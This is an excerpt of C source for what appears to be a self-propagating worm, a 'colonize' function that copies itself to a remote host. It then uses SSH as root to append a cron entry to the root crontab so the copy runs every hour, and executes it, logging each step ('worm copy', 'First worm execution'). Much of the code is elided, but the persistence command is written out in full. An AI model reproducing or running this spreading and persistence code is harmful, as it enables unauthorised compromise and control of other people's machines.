...
int colonize(char *host, char *file) {
	...
	// syslog message
	msg = (char *) malloc(strlen("## colonization of ") + strlen(host) + 1);
	if (msg != NULL) {
	...
	if (ret == 0 ) {
		// syslog message
		msg = (char *) malloc(strlen("## worm copy on %s") + strlen(host) + 1);
		if (msg != NULL) {
		...
		if (ret == 0) {
			...
			memset(command, 0, 4096);
			sprintf(command, "%s -p %d root@%s \" echo 0 \\* \\* \\* \\* %s >> /var/spool/cron/crontabs/root \"", SSH, PORT, host, file_path);
			ret = system(command);
			// if the command succeeded
			if (ret == 0) {
				msg = (char *) malloc(strlen("## Automatic launch configuration for %s") + strlen(host) + 1);
				if (msg != NULL) {
				...
				ret = system(command);
				if (ret == 0) {
					msg = (char *) malloc(strlen("## First worm execution on ") + strlen(host) + 1);
					if (msg != NULL) {
